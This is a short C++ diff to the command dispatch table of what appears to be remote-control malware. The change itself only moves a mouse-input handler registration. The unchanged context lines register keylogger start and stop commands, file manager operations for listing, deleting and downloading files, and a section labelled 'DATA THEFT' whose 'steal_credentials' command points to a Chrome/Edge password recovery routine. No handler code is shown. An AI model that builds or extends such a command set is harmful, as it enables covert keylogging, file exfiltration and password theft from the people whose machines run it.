@@ -52,6 +52,7 @@ public:
         // === KEYLOGGER & MOUSE ===
         map["start_keylog"] = ProcessHandlers::startKeylog;
         map["stop_keylog"] = ProcessHandlers::stopKeylog;
+        map["mouse_input"] = ProcessHandlers::handleMouseInput;
 
         // FILE MANAGER HANDLERS
         map["fs_drives"] = FileHandlers::listDrives;
@@ -60,7 +61,6 @@ public:
         map["fs_mkfile"] = FileHandlers::createFile;
         map["fs_delete"] = FileHandlers::deleteItem;
         map["fs_download"] = FileHandlers::downloadFile;
-        map["mouse_input"] = ProcessHandlers::handleMouseInput;
 
         // === DATA THEFT ===
         map["steal_credentials"] = ChromeRecovery::handleStealCredentials; // Lấy Pass (Edge/Chrome cũ)
